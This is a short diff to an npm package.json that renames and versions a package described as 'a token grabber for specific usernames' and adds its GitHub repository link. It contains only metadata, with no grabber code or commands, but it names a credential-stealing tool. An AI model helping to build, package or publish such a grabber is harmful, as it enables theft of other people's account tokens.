@@ -1,10 +1,14 @@
 {
-  "name": "@dsb.js/grabber",
-  "version": "1.0.0",
-  "description": "a token grabber",
+  "name": "dsb.js-grabber",
+  "version": "1.1.0",
+  "description": "a token grabber for specific usernames",
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/TheDevYellowy/tokenGrabber.git"
   },
   "author": "TheDevYellowy",
   "license": "ISC"
